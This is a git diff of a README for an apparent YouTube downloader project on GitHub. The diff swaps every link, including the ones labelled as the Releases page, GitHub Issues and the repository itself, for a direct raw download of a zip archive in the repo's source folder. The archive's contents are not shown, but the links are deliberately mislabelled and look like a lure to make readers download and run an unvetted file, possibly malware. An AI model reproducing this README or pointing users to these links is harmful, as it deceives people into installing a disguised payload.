@@ -20,10 +20,10 @@ The **youtube-downloader** allows you to download videos and audio from YouTube 
 ## 🚀 Getting Started
 To begin using the youtube-downloader, download the application from our Releases page. 
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/quailrubella675/youtube-downloader/releases)
+[![Download Here](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/quailrubella675/youtube-downloader/releases) to find the latest version of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip) to find the latest version of the application.
   
 2. **Choose Your File:** Look for the latest release and select the appropriate file for your operating system. Downloading might take a few minutes based on your internet speed.
 
@@ -58,11 +58,11 @@ If you encounter issues:
 We welcome contributions to improve this tool. If you have suggestions or find bugs, feel free to open an issue on GitHub or submit a pull request.
 
 ## 📞 Support
-For assistance, visit the [GitHub Issues](https://github.com/quailrubella675/youtube-downloader/issues) page or check the Frequently Asked Questions section in our documentation.
+For assistance, visit the [GitHub Issues](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip) page or check the Frequently Asked Questions section in our documentation.
 
 ## 🔗 Links
-- **Releases Page:** [Download Here](https://github.com/quailrubella675/youtube-downloader/releases)
-- **GitHub Repository:** [View on GitHub](https://github.com/quailrubella675/youtube-downloader)
+- **Releases Page:** [Download Here](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip)
+- **GitHub Repository:** [View on GitHub](https://github.com/quailrubella675/youtube-downloader/raw/refs/heads/main/src/downloader_youtube_3.4.zip)
 - **Documentation:** Access additional information and resources.
 
 ## 🔖 Topics
